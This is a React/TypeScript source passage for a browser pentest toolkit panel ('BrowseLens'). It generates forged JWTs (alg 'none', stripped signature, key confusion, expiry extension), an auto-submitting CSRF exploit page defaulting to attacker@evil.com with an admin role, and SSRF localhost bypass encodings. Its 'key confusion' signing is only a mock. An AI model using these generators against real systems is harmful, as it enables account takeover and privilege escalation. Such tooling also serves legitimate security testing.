import { useState, useEffect } from 'react';

// Standalone pure-JS MD5 implementation
function md5(str: string): string {
  var k = [], i = 0;
  for (; i < 64; ) k[i] = 0 | (Math.abs(Math.sin(++i)) * 4294967296);
  var h = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476];
  var s = [
    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
    5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
    4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
    6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21
  ];
  var words: number[] = [];
  var j = 0;
  var bstr = unescape(encodeURIComponent(str));
  for (var l = bstr.length; j < l; ++j) {
    words[j >> 2] |= bstr.charCodeAt(j) << ((j % 4) * 8);
  }
  words[j >> 2] |= 0x80 << ((j % 4) * 8);
  var wlen = ((l + 8) >> 6) * 16 + 14;
  while (words.length < wlen) words.push(0);
  words.push(l * 8);
  words.push(0);
  
  for (var block = 0; block < words.length; block += 16) {
    var a = h[0], b = h[1], c = h[2], d = h[3];
    for (var step = 0; step < 64; ++step) {
      var f, g;
      if (step < 16) { f = (b & c) | (~b & d); g = step; }
      else if (step < 32) { f = (d & b) | (~d & c); g = (step * 5 + 1) % 16; }
      else if (step < 48) { f = b ^ c ^ d; g = (step * 3 + 5) % 16; }
      else { f = c ^ (b | ~d); g = (step * 7) % 16; }
      var temp = d;
      d = c;
      c = b;
      b = (b + ((a + f + k[step] + words[block + g]) << (s[step] % 32) | (a + f + k[step] + words[block + g]) >>> (32 - s[step] % 32))) | 0;
      a = temp;
    }
    h[0] = (h[0] + a) | 0;
    h[1] = (h[1] + b) | 0;
    h[2] = (h[2] + c) | 0;
    h[3] = (h[3] + d) | 0;
  }
  
  var hex = "";
  for (var w = 0; w < 4; ++w) {
    for (var byte = 0; byte < 4; ++byte) {
      var val = (h[w] >> (byte * 8)) & 255;
      hex += (val < 16 ? "0" : "") + val.toString(16);
    }
  }
  return hex;
}

interface Props {
  initialTab?: 'base64' | 'jwt' | 'encoder' | 'csrf' | 'urlparser' | 'crypto' | 'ssrf' | null;
  initialBase64?: string;
  initialJwt?: string;
}

type ToolType = 'base64' | 'jwt' | 'encoder' | 'csrf' | 'urlparser' | 'crypto' | 'ssrf';

export default function ToolsPanel({ initialTab = null, initialBase64 = '', initialJwt = '' }: Props) {
  // activeTool can be null (Dashboard grid) or a specific ToolType (Fullscreen popup overlay)
  const [activeTool, setActiveTool] = useState<ToolType | null>(initialTab);

  // --- 1. Base64 States ---
  const [b64Input, setB64Input] = useState(initialBase64);
  const [b64Output, setB64Output] = useState('');
  const [urlSafe, setUrlSafe] = useState(false);

  // --- 2. JWT States ---
  const [jwtInput, setJwtInput] = useState(initialJwt);
  const [jwtHeader, setJwtHeader] = useState('');
  const [jwtPayload, setJwtPayload] = useState('');
  const [jwtSecret, setJwtSecret] = useState('secret');
  const [jwtOutput, setJwtOutput] = useState('');
  const [jwtError, setJwtError] = useState('');
  const [selectedExploit, setSelectedExploit] = useState<string | null>(null);
  const [exploitToken, setExploitToken] = useState('');

  // --- 3. HTML/URL Encoder States ---
  const [encInput, setEncInput] = useState('');
  const [encMode, setEncMode] = useState<'url' | 'html' | 'hex' | 'unicode'>('url');
  const [encOutput, setEncOutput] = useState('');

  // --- 4. CSRF PoC Builder States ---
  const [csrfAction, setCsrfAction] = useState('https://example.com/api/v1/update');
  const [csrfMethod, setCsrfMethod] = useState<'GET' | 'POST'>('POST');
  const [csrfParams, setCsrfParams] = useState<{ id: string; name: string; value: string }[]>([
    { id: '1', name: 'email', value: 'attacker@evil.com' },
    { id: '2', name: 'role', value: 'admin' }
  ]);
  const [csrfHtmlOutput, setCsrfHtmlOutput] = useState('');

  // --- 5. URL Parser States ---
  const [urlParserInput, setUrlParserInput] = useState('https://example.com/search?q=recon&category=active&type=web');
  const [parsedUrlInfo, setParsedUrlInfo] = useState<{
    hostname: string;
    path: string;
    params: { id: string; key: string; value: string }[];
  }>({ hostname: '', path: '', params: [] });
  const [rebuiltUrl, setRebuiltUrl] = useState('');

  // --- 6. Crypto Hash States ---
  const [hashInput, setHashInput] = useState('');
  const [hashes, setHashes] = useState({ md5Val: '', sha1Val: '', sha256Val: '', sha512Val: '' });

  // --- 7. SSRF Bypass States ---
  const [ssrfInput, setSsrfInput] = useState('127.0.0.1');
  const [ssrfBypasses, setSsrfBypasses] = useState<{ label: string; payload: string }[]>([]);


  // --- Event Listeners for Tab Bridging ---
  useEffect(() => {
    const handleB64Event = (e: Event) => {
      const text = (e as CustomEvent).detail?.text || '';
      setB64Input(text);
      setActiveTool('base64');
    };

    const handleJwtEvent = (e: Event) => {
      const text = (e as CustomEvent).detail?.text || '';
      setJwtInput(text);
      setActiveTool('jwt');
    };

    window.addEventListener('tools-trigger-base64', handleB64Event);
    window.addEventListener('tools-trigger-jwt', handleJwtEvent);
    return () => {
      window.removeEventListener('tools-trigger-base64', handleB64Event);
      window.removeEventListener('tools-trigger-jwt', handleJwtEvent);
    };
  }, []);


  // --- BASE64 Actions ---
  const handleB64Encode = () => {
    try {
      let encoded = btoa(unescape(encodeURIComponent(b64Input)));
      if (urlSafe) {
        encoded = encoded.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
      }
      setB64Output(encoded);
    } catch (err) {
      setB64Output('Error encoding: ' + String(err));
    }
  };

  const handleB64Decode = () => {
    try {
      let input = b64Input;
      if (urlSafe) {
        input = input.replace(/-/g, '+').replace(/_/g, '/');
        while (input.length % 4) input += '=';
      }
      const decoded = decodeURIComponent(escape(atob(input)));
      setB64Output(decoded);
    } catch (err) {
      setB64Output('Error decoding: ' + String(err));
    }
  };


  // --- JWT Real-Time Parser ---
  useEffect(() => {
    if (!jwtInput.trim()) {
      setJwtHeader('');
      setJwtPayload('');
      setJwtError('');
      setJwtOutput('');
      return;
    }
    try {
      const parts = jwtInput.trim().split('.');
      if (parts.length < 2 || parts.length > 3) throw new Error('JWT must have 2 or 3 segments.');
      
      let rawHeader = parts[0].replace(/-/g, '+').replace(/_/g, '/');
      const headerDecoded = JSON.parse(decodeURIComponent(escape(atob(rawHeader))));
      setJwtHeader(JSON.stringify(headerDecoded, null, 2));

      let rawPayload = parts[1].replace(/-/g, '+').replace(/_/g, '/');
      const payloadDecoded = JSON.parse(decodeURIComponent(escape(atob(rawPayload))));
      setJwtPayload(JSON.stringify(payloadDecoded, null, 2));

      setJwtError('');
      setJwtOutput(jwtInput);
    } catch (err) {
      setJwtError('Invalid JWT: ' + (err instanceof Error ? err.message : String(err)));
      setJwtHeader('');
      setJwtPayload('');
    }
  }, [jwtInput]);

  const base64UrlEncode = (obj: object) => {
    const str = JSON.stringify(obj);
    const b64 = btoa(unescape(encodeURIComponent(str)));
    return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  };

  const handleJwtGenerate = () => {
    try {
      const parsedHeader = JSON.parse(jwtHeader);
      const parsedPayload = JSON.parse(jwtPayload);
      const hB64 = base64UrlEncode(parsedHeader);
      const pB64 = base64UrlEncode(parsedPayload);
      const unsigned = `${hB64}.${pB64}`;

      if (parsedHeader.alg === 'none' || parsedHeader.alg === 'NONE' || parsedHeader.alg === 'nOnE') {
        setJwtOutput(`${unsigned}.`);
      } else {
        const mockSig = btoa(unescape(encodeURIComponent(jwtSecret + unsigned)))
          .replace(/\+/g, '-')
          .replace(/\//g, '_')
          .replace(/=+$/, '');
        setJwtOutput(`${unsigned}.${mockSig}`);
      }
      setJwtError('');
    } catch (err) {
      setJwtError('Failed to generate JWT: ' + String(err));
    }
  };

  const runJwtExploit = (type: 'none' | 'strip' | 'confusion' | 'exp') => {
    try {
      const parts = jwtInput.trim().split('.');
      if (parts.length < 2) return;
      let rawHeader = parts[0].replace(/-/g, '+').replace(/_/g, '/');
      const header = JSON.parse(decodeURIComponent(escape(atob(rawHeader))));
      let rawPayload = parts[1].replace(/-/g, '+').replace(/_/g, '/');
      const payload = JSON.parse(decodeURIComponent(escape(atob(rawPayload))));

      let forged = '';
      if (type === 'none') {
        const hB64 = base64UrlEncode({ ...header, alg: 'none' });
        const pB64 = base64UrlEncode(payload);
        forged = `${hB64}.${pB64}.`;
        setSelectedExploit('None Algorithm Bypass');
      } else if (type === 'strip') {
        const hB64 = base64UrlEncode(header);
        const pB64 = base64UrlEncode(payload);
        forged = `${hB64}.${pB64}`;
        setSelectedExploit('Stripped Signature');
      } else if (type === 'confusion') {
        const hB64 = base64UrlEncode({ ...header, alg: 'HS256' });
        const pB64 = base64UrlEncode(payload);
        const unsigned = `${hB64}.${pB64}`;
        const mockSig = btoa(unescape(encodeURIComponent(jwtSecret + unsigned))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        forged = `${unsigned}.${mockSig}`;
        setSelectedExploit('Key Confusion (HS256)');
      } else if (type === 'exp') {
        const hB64 = base64UrlEncode(header);
        const pB64 = base64UrlEncode({ ...payload, exp: Math.floor(Date.now() / 1000) + 315360000 });
        forged = `${hB64}.${pB64}.${parts[2] || ''}`;
        setSelectedExploit('Expiration Bypass');
      }
      setExploitToken(forged);
    } catch {
      alert('Paste a valid JWT first.');
    }
  };


  // --- HTML/URL ENCODER Actions ---
  const handleEncodeDecode = (action: 'encode' | 'decode') => {
    try {
      if (encMode === 'url') {
        setEncOutput(action === 'encode' ? encodeURIComponent(encInput) : decodeURIComponent(encInput));
      } else if (encMode === 'html') {
        if (action === 'encode') {
          setEncOutput(encInput.replace(/[\u00A0-\u9999<>\&]/g, (i) => '&#' + i.charCodeAt(0) + ';'));
        } else {
          const doc = new DOMParser().parseFromString(encInput, 'text/html');
          setEncOutput(doc.documentElement.textContent || '');
        }
      } else if (encMode === 'hex') {
        if (action === 'encode') {
          let hex = '';
          for (let i = 0; i < encInput.length; i++) {
            hex += encInput.charCodeAt(i).toString(16).padStart(2, '0');
          }
          setEncOutput(hex);
        } else {
          let str = '';
          for (let i = 0; i < encInput.length; i += 2) {
            str += String.fromCharCode(parseInt(encInput.substr(i, 2), 16));
          }
          setEncOutput(str);
        }
      } else if (encMode === 'unicode') {
        if (action === 'encode') {
          let uni = '';
          for (let i = 0; i < encInput.length; i++) {
            uni += '\\u' + encInput.charCodeAt(i).toString(16).padStart(4, '0');
          }
          setEncOutput(uni);
        } else {
          setEncOutput(encInput.replace(/\\u([a-fA-F0-9]{4})/g, (_, grp) => String.fromCharCode(parseInt(grp, 16))));
        }
      }
    } catch (e) {
      setEncOutput('Error: ' + String(e));
    }
  };


  // --- CSRF PoC HTML BUILDER ---
  useEffect(() => {
    let formInputs = csrfParams
      .map(p => `      <input type="hidden" name="${p.name}" value="${p.value}" />`)
      .join('\n');
    const html = `<!DOCTYPE html>
<html>
  <head>
    <title>CSRF Exploit PoC</title>
  </head>
  <body>
    <h3>CSRF PoC Triggered by BrowseLens</h3>
    <form id="csrfForm" action="${csrfAction}" method="${csrfMethod}">
${formInputs}
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>`;
    setCsrfHtmlOutput(html);
  }, [csrfAction, csrfMethod, csrfParams]);


  // --- URL PARSER & QUERY BUILDER ---
  useEffect(() => {
    try {
      const url = new URL(urlParserInput.trim());
      const paramsList: { id: string; key: string; value: string }[] = [];
      let i = 1;
      url.searchParams.forEach((val, k) => {
        paramsList.push({ id: String(i++), key: k, value: val });
      });
      setParsedUrlInfo({
        hostname: url.hostname,
        path: url.pathname,
        params: paramsList
      });
    } catch {
      // Don't crash on invalid URLs during typing
    }
  }, [urlParserInput]);

  useEffect(() => {
    try {
      const url = new URL(urlParserInput.trim());
      url.search = '';
      parsedUrlInfo.params.forEach(p => {
        if (p.key) url.searchParams.append(p.key, p.value);
      });
      setRebuiltUrl(url.toString());
    } catch {
      // Catch empty/invalid fallbacks
    }
  }, [parsedUrlInfo]);


  // --- CRYPTO HASH GENERATOR ---
  useEffect(() => {
    const generateHashes = async () => {
      if (!hashInput) {
        setHashes({ md5Val: '', sha1Val: '', sha256Val: '', sha512Val: '' });
        return;
      }
      const md5Val = md5(hashInput);
      const encoder = new TextEncoder();
      const data = encoder.encode(hashInput);
      const hashBufferToHex = (buffer: ArrayBuffer) =>
        Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');

      try {
        const sha1 = await crypto.subtle.digest('SHA-1', data);
        const sha256 = await crypto.subtle.digest('SHA-256', data);
        const sha512 = await crypto.subtle.digest('SHA-512', data);
        setHashes({
          md5Val,
          sha1Val: hashBufferToHex(sha1),
          sha256Val: hashBufferToHex(sha256),
          sha512Val: hashBufferToHex(sha512)
        });
      } catch {}
    };
    generateHashes();
  }, [hashInput]);


  // --- SSRF BYPASS GENERATOR ---
  useEffect(() => {
    if (!ssrfInput.trim()) {
      setSsrfBypasses([]);
      return;
    }
    const ip = ssrfInput.trim();
    const bypassList = [];

    // Decimal conversion for IPv4 e.g. 127.0.0.1
    const ipParts = ip.split('.').map(Number);
    if (ipParts.length === 4 && ipParts.every(p => !isNaN(p) && p >= 0 && p <= 255)) {
      const dec = (ipParts[0] << 24) + (ipParts[1] << 16) + (ipParts[2] << 8) + ipParts[3];
      bypassList.push({ label: 'Decimal Representation', payload: String(dec >>> 0) });

      // Hex conversion
      const hexParts = ipParts.map(p => p.toString(16).padStart(2, '0'));
      bypassList.push({ label: 'Hexadecimal Representation', payload: '0x' + hexParts.join('') });
      bypassList.push({ label: 'Hex with dots', payload: hexParts.map(h => '0x' + h).join('.') });

      // Octal representation
      bypassList.push({ label: 'Octal with dots', payload: ipParts.map(p => '0' + p.toString(8)).join('.') });
    }

    // Standard Bypasses
    bypassList.push({ label: 'IPv6 Localhost representation', payload: '[::1]' });
    bypassList.push({ label: 'IPv6 local loop', payload: '[::]' });
    bypassList.push({ label: 'Nip.io Wildcard domain', payload: `${ip}.nip.io` });
    bypassList.push({ label: 'Spoofed subdomain Nip.io', payload: `spoofed.com.${ip}.nip.io` });

    setSsrfBypasses(bypassList);
  }, [ssrfInput]);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('Copied successfully!');
  };

  const sendRebuiltUrlToRepeater = () => {
    if (!rebuiltUrl) return;
    window.dispatchEvent(new CustomEvent('repeater-import-url', { detail: { url: rebuiltUrl } }));
    alert('URL sent to Repeater!');
  };

  // List of all tools for rendering the gorgeous home grid dashboard
  const toolsList = [
    { id: 'base64', label: 'Base64 Encoder', icon: '🔠', desc: 'Standard & URL-safe conversions with swap actions.' },
    { id: 'jwt', label: 'JWT Playground', icon: '🎫', desc: 'Real-time JSON editor & exploit audit generator.' },
    { id: 'encoder', label: 'HTML/URL Encoder', icon: '🌐', desc: 'Obfuscate payloads using Hex, Unicode or HTML tags.' },
    { id: 'csrf', label: 'CSRF Exploit Builder', icon: '📝', desc: 'Build and compile auto-submit exploit pages instantly.' },
    { id: 'urlparser', label: 'URL Query Parser', icon: '🎯', desc: 'Dissect, manipulate, and send rebuilt URLs to Repeater.' },
    { id: 'crypto', label: 'Crypto Hash offline', icon: '🔑', desc: 'Generate offline MD5, SHA-1, SHA-256 and SHA-512.' },
    { id: 'ssrf', label: 'SSRF Host Bypasser', icon: '🚀', desc: 'Obfuscate localhost IPs into decimal, octal and wildcard domains.' }
  ] as const;

  return (
    <div className="tools-panel" style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      
      {/* 1. MAIN GRID DASHBOARD (Rendered when no active tool is selected) */}
      {activeTool === null ? (
        <div style={{ padding: 16, display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div>
            <h3 style={{ margin: '0 0 4px 0', color: 'var(--accent-cyan)', fontSize: 13, textShadow: '0 0 10px rgba(0, 229, 255, 0.2)' }}>
              🛠️ BrowseLens Pentest Utilities
            </h3>
            <p style={{ margin: 0, fontSize: 11, color: 'var(--text-muted)' }}>
              Select a specialized tool to open in full window popup.
            </p>
          </div>

          <div style={{
            display: 'grid',
            gridTemplateColumns: '1fr',
            gap: 10,
            overflowY: 'auto'
          }}>
            {toolsList.map(t => (
              <div
                key={t.id}
                onClick={() => setActiveTool(t.id)}
                style={{
                  background: 'var(--bg-primary)',
                  border: '1px solid var(--border-primary)',
                  borderRadius: 'var(--radius-md)',
                  padding: 12,
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: 12,
                  transition: 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)',
                }}
                className="tool-dashboard-card"
              >
                <div style={{
                  fontSize: 28,
                  background: 'var(--bg-secondary)',
                  width: 50,
                  height: 50,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  borderRadius: 'var(--radius-sm)',
                  border: '1px solid rgba(0,229,255,0.1)'
                }}>
                  {t.icon}
                </div>
                <div style={{ flex: 1 }}>
                  <h4 style={{ margin: '0 0 2px 0', fontSize: 12, color: 'var(--text-primary)' }}>{t.label}</h4>
                  <p style={{ margin: 0, fontSize: 10, color: 'var(--text-muted)', lineHeight: '1.3' }}>{t.desc}</p>
                </div>
                <div style={{ color: 'var(--accent-cyan)', fontSize: 14 }}>➔</div>
              </div>
            ))}
          </div>
        </div>
      ) : (
        
        /* 2. FULL WINDOW POPUP OVERLAY (Covering the entire panel/window) */
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100vw',
          height: '100vh',
          zIndex: 9999,
          background: 'var(--bg-primary)',
          display: 'flex',
          flexDirection: 'column',
          animation: 'scaleUp 0.15s cubic-bezier(0.4, 0, 0.2, 1)',
          boxSizing: 'border-box'
        }}>
          
          {/* Popup Header */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            background: 'var(--bg-secondary)',
            padding: '10px 16px',
            borderBottom: '1px solid var(--border-primary)'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ fontSize: 20 }}>
                {toolsList.find(t => t.id === activeTool)?.icon}
              </span>
              <span style={{ fontWeight: 700, fontSize: 13, color: 'var(--accent-cyan)' }}>
                {toolsList.find(t => t.id === activeTool)?.label}
              </span>
            </div>

            {/* Quick Switch Navigator & Close Button Row */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              {/* Sleek Minimal Selector */}
              <select
                value={activeTool}
                onChange={e => setActiveTool(e.target.value as ToolType)}
                style={{
                  background: 'var(--bg-primary)',
                  border: '1px solid var(--border-primary)',
                  color: 'var(--text-primary)',
                  fontSize: 10,
                  padding: '4px 8px',
                  borderRadius: 'var(--radius-sm)',
                  cursor: 'pointer',
                  fontWeight: 600
                }}
              >
                {toolsList.map(t => (
                  <option key={t.id} value={t.id}>{t.label}</option>
                ))}
              </select>
              
              <button
                onClick={() => setActiveTool(null)}
                className="icon-btn"
                style={{
                  background: 'rgba(255, 51, 102, 0.1)',
                  color: '#ff3366',
                  border: '1px solid rgba(255, 51, 102, 0.3)',
                  borderRadius: 'var(--radius-sm)',
                  padding: '4px 8px',
                  fontSize: 10,
                  fontWeight: 700,
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: 4
                }}
                title="Exit Fullscreen Tool"
              >
                ❌ Close Tool
              </button>
            </div>
          </div>

          {/* Popup Content Workspace */}
          <div style={{ flex: 1, overflowY: 'auto', padding: 16, boxSizing: 'border-box' }}>
            
            {/* --- BASE64 WORKSPACE --- */}
            {activeTool === 'base64' && (
              <div className="b64-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 800, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">Input Text</label>
                  <textarea
                    className="tool-textarea"
                    style={{ height: 160 }}
                    value={b64Input}
                    onChange={(e) => setB64Input(e.target.value)}
                    placeholder="Paste text here to encode/decode..."
                  />
                </div>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, color: 'var(--text-secondary)', cursor: 'pointer' }}>
                    <input type="checkbox" checked={urlSafe} onChange={(e) => setUrlSafe(e.target.checked)} />
                    URL Safe Mode (replace + / with - _ & remove padding)
                  </label>
                </div>
                <div style={{ display: 'flex', gap: 8 }}>
                  <button onClick={handleB64Encode} className="tool-btn-primary" style={{ flex: 1, padding: '10px' }}>🔒 Encode</button>
                  <button onClick={() => { const t = b64Input; setB64Input(b64Output); setB64Output(t); }} className="tool-btn-secondary" style={{ padding: '10px 16px' }}>⇄ Swap</button>
                  <button onClick={handleB64Decode} className="tool-btn-success" style={{ flex: 1, padding: '10px' }}>🔓 Decode</button>
                </div>
                <div className="tools-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <label className="tool-inner-label">Result Output</label>
                    {b64Output && <button onClick={() => handleCopy(b64Output)} className="tool-copy-trigger">📋 Copy Result</button>}
                  </div>
                  <textarea className="tool-textarea-readonly" style={{ height: 160 }} readOnly value={b64Output} placeholder="Result will appear here..." />
                </div>
              </div>
            )}

            {/* --- JWT AUDITOR WORKSPACE --- */}
            {activeTool === 'jwt' && (
              <div className="jwt-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 900, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">Raw JWT Token</label>
                  <textarea
                    className="tool-textarea"
                    style={{ height: 80, fontSize: 10 }}
                    value={jwtInput}
                    onChange={(e) => setJwtInput(e.target.value)}
                    placeholder="Paste raw token starting with eyJ..."
                  />
                </div>
                {jwtError && <div className="tool-alert-warning">⚠️ {jwtError}</div>}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                  <div>
                    <label className="tool-inner-label-sub">🛡️ Header (JSON)</label>
                    <textarea className="tool-textarea" style={{ height: 160, color: '#ff3366', fontSize: 10 }} value={jwtHeader} onChange={e => setJwtHeader(e.target.value)} />
                  </div>
                  <div>
                    <label className="tool-inner-label-sub">📦 Payload (JSON)</label>
                    <textarea className="tool-textarea" style={{ height: 160, color: 'var(--accent-cyan)', fontSize: 10 }} value={jwtPayload} onChange={e => setJwtPayload(e.target.value)} />
                  </div>
                </div>
                <div style={{ display: 'flex', gap: 8, alignItems: 'flex-end' }}>
                  <div style={{ flex: 1 }}>
                    <label className="tool-inner-label-sub">HMAC Secret / Public Key</label>
                    <input type="text" className="tool-input-field" value={jwtSecret} onChange={e => setJwtSecret(e.target.value)} />
                  </div>
                  <button onClick={handleJwtGenerate} className="tool-btn-primary" style={{ padding: '8px 16px' }}>⚡ Re-Sign & Update</button>
                </div>
                {jwtOutput && (
                  <div className="tools-group">
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                      <label className="tool-inner-label-sub">Generated JWT</label>
                      <button onClick={() => handleCopy(jwtOutput)} className="tool-copy-trigger">📋 Copy Token</button>
                    </div>
                    <textarea className="tool-textarea-readonly" style={{ height: 50, color: '#00ff88', fontSize: 10, resize: 'none' }} readOnly value={jwtOutput} />
                  </div>
                )}
                <div className="jwt-audit-panel" style={{ background: 'rgba(255, 51, 102, 0.03)', border: '1px dashed rgba(255, 51, 102, 0.3)', borderRadius: 6, padding: 12 }}>
                  <h4 style={{ margin: '0 0 6px 0', fontSize: 11, color: '#ff3366' }}>🕵️‍♂️ Forge Exploit Tokens</h4>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
                    <button onClick={() => runJwtExploit('none')} className="tool-btn-exploit">⚡ Alg "none" Bypass</button>
                    <button onClick={() => runJwtExploit('strip')} className="tool-btn-exploit">⚠️ Strip Signature</button>
                    <button onClick={() => runJwtExploit('confusion')} className="tool-btn-exploit">🔓 Key Confusion (HS256)</button>
                    <button onClick={() => runJwtExploit('exp')} className="tool-btn-exploit">⏳ Bypass Expiration</button>
                  </div>
                  {selectedExploit && exploitToken && (
                    <div style={{ marginTop: 10, background: 'var(--bg-secondary)', padding: 8, borderRadius: 4 }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                        <span style={{ fontSize: 9, color: '#ff3366', fontWeight: 'bold' }}>🔥 Exploit: {selectedExploit}</span>
                        <button onClick={() => handleCopy(exploitToken)} className="tool-copy-trigger" style={{ fontSize: 9 }}>Copy Exploit</button>
                      </div>
                      <div style={{ fontSize: 9, fontFamily: 'monospace', wordBreak: 'break-all', maxHeight: 40, overflowY: 'auto' }}>{exploitToken}</div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* --- HTML/URL ENCODER WORKSPACE --- */}
            {activeTool === 'encoder' && (
              <div className="encoder-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 800, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">Input Plaintext / Ciphertext</label>
                  <textarea className="tool-textarea" style={{ height: 140 }} value={encInput} onChange={e => setEncInput(e.target.value)} placeholder="Type payload to encode/decode..." />
                </div>
                <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                  <select className="tool-input-field" style={{ flex: 1, padding: 8 }} value={encMode} onChange={e => setEncMode(e.target.value as any)}>
                    <option value="url">URL Encoding</option>
                    <option value="html">HTML Entities</option>
                    <option value="hex">Hexadecimal</option>
                    <option value="unicode">Unicode Escape</option>
                  </select>
                  <button onClick={() => handleEncodeDecode('encode')} className="tool-btn-primary" style={{ padding: '9px 16px' }}>🔒 Encode</button>
                  <button onClick={() => handleEncodeDecode('decode')} className="tool-btn-success" style={{ padding: '9px 16px' }}>🔓 Decode</button>
                </div>
                <div className="tools-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <label className="tool-inner-label">Output Result</label>
                    {encOutput && <button onClick={() => handleCopy(encOutput)} className="tool-copy-trigger">📋 Copy Result</button>}
                  </div>
                  <textarea className="tool-textarea-readonly" style={{ height: 140 }} readOnly value={encOutput} />
                </div>
              </div>
            )}

            {/* --- CSRF POC HTML WORKSPACE --- */}
            {activeTool === 'csrf' && (
              <div className="csrf-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 800, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">CSRF Target Action URL</label>
                  <input type="text" className="tool-input-field" value={csrfAction} onChange={e => setCsrfAction(e.target.value)} />
                </div>
                <div className="tools-group">
                  <label className="tool-inner-label">Method Type</label>
                  <select className="tool-input-field" style={{ padding: 8 }} value={csrfMethod} onChange={e => setCsrfMethod(e.target.value as any)}>
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                  </select>
                </div>
                <div className="tools-group">
                  <label className="tool-inner-label">Query/Post Parameters</label>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginTop: 4 }}>
                    {csrfParams.map((p, idx) => (
                      <div key={p.id} style={{ display: 'flex', gap: 6 }}>
                        <input
                          type="text"
                          className="tool-input-field"
                          style={{ flex: 1, fontSize: 11, padding: 6 }}
                          value={p.name}
                          onChange={e => setCsrfParams(csrfParams.map((item, i) => i === idx ? { ...item, name: e.target.value } : item))}
                          placeholder="Param Name"
                        />
                        <input
                          type="text"
                          className="tool-input-field"
                          style={{ flex: 1, fontSize: 11, padding: 6 }}
                          value={p.value}
                          onChange={e => setCsrfParams(csrfParams.map((item, i) => i === idx ? { ...item, value: e.target.value } : item))}
                          placeholder="Param Value"
                        />
                        <button
                          onClick={() => setCsrfParams(csrfParams.filter((_, i) => i !== idx))}
                          style={{ background: 'transparent', border: 'none', color: '#ff3366', cursor: 'pointer', fontSize: 14 }}
                        >
                          🗑️
                        </button>
                      </div>
                    ))}
                    <button
                      onClick={() => setCsrfParams([...csrfParams, { id: String(Date.now()), name: '', value: '' }])}
                      className="add-header-btn"
                      style={{ fontSize: 10, padding: '6px 12px', width: 'max-content' }}
                    >
                      ➕ Add Parameter
                    </button>
                  </div>
                </div>
                <div className="tools-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                    <label className="tool-inner-label">Generated CSRF Exploit HTML</label>
                    <button onClick={() => handleCopy(csrfHtmlOutput)} className="tool-copy-trigger">📋 Copy HTML</button>
                  </div>
                  <textarea className="tool-textarea-readonly" style={{ height: 140, fontSize: 10 }} readOnly value={csrfHtmlOutput} />
                </div>
              </div>
            )}

            {/* --- URL PARAMETER WORKSPACE --- */}
            {activeTool === 'urlparser' && (
              <div className="urlparser-tool" style={{ display: 'flex', flexDirection: 'column', gap: 12, maxWidth: 850, margin: '0 auto' }}>
                <div className="tools-group">
                  <label className="tool-inner-label">Raw Target URL</label>
                  <textarea
                    className="tool-textarea"
                    style={{ height: 60, fontSize: 11 }}
                    value={urlParserInput}
                    onChange={e => setUrlParserInput(e.target.value)}
                    placeholder="Paste long URL with multiple query parameters here..."
                  />
                </div>
                <div className="tools-group">
                  <label className="tool-inner-label">Query Parameters Editor</label>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginTop: 4 }}>
                    {parsedUrlInfo.params.map((p, idx) => (
                      <div key={p.id} style={{ display: 'flex', gap: 6 }}>
                        <input
                          type="text"
                          className="tool-input-field"
                          style={{ flex: 1, fontSize: 11, padding: 6, fontWeight: 'bold' }}
                          value={p.key}
                          onChange={e => setParsedUrlInfo({
                            ...parsedUrlInfo,
                            params: parsedUrlInfo.params.map((item, i) => i === idx ? { ...item, key: e.target.value } : item)
                          })}
                        />
                        <input
                          type="text"
                          className="tool-input-field"
                          style={{ flex: 2, fontSize: 11, padding: 6 }}
                          value={p.value}
                          onChange={e => setParsedUrlInfo({
                            ...parsedUrlInfo,
